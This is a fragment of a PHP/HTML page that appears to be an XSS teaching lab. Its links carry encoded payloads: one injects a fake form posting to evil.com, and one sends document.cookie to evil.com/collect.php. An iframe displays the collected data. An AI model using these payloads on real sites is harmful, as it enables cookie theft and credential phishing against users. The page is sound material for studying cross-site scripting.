		...
		<div class="col-md-8">
			...
			<form action="index.php" method="post">
				...
				<p>
					...
					<a class="btn btn-xs btn-default" href="./?user=<?php echo urlencode('" style="display:none"/></label></div></form><form action="http://evil.com/collect.php?"><div><label><input autocomplete="off" type="text" name="username" class="form-control" value="') ?>">Reflected 2</a>
				</p>
				<p>
					...
					<a class="btn btn-xs btn-default" href="./?user=<?php echo urlencode('"/><script>var img=new Image(); img.src="http://evil.com/collect.php?"+document.cookie;</script><span class="') ?>">DOM 3</a>
				</p>
				<p>Last request: <strong><?php echo htmlspecialchars($_GET['user']) ?></strong></p>
				<p>HTML generated: <strong><?php echo htmlspecialchars('<div><label>Username <input autocomplete="off" type="text" name="username" class="form-control" value="' . $_GET['user'] . '"/></label></div>') ?></strong></p>

			</form>
		</div>
		<div class="col-md-4">
			<h2>XSS: Collection</h2>
      <iframe id="myiframe" src="http://evil.com/collect-read.php" height="auto"/>
			<h2>Others...</h2>
			<ul>
